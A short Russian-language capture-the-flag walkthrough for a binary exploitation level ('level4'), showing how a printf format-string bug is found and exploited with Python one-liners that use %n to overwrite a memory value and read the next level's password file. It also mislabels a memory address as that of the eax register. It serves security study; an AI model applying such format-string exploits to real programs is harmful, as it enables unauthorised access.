## level4
![](docs/img/level4_1.png)

Из `main` у нас вызывается функция `n()`,

![](docs/img/level4_2.png)

где вызывается функция `p()`

![](docs/img/level4_3.png)

(с единственным вызовом — `printf()` и извлекается содержимое файла `level5/.pass` при совпадении регистра `eax` с числом `0x1025544` (16930116 в десятичной системе). Следовательно, этот регистр необходимо перезаписать, используя функцию `printf()`. Адрес регистра `eax` — `0x8049810`. Находим позицию буфера:

```sh
./level4 <<< $(python -c 'print "aaaa" + " %x" * 15')
```

Видим, что при данном выводе `aaaa` (`0x61616161`) находится на 12й позиции.

```
aaaa b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
```

Для записи числа 16930116 используем модификатор `%x`. Итоговая команда:

```sh
./level4 <<< $(python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"')
```
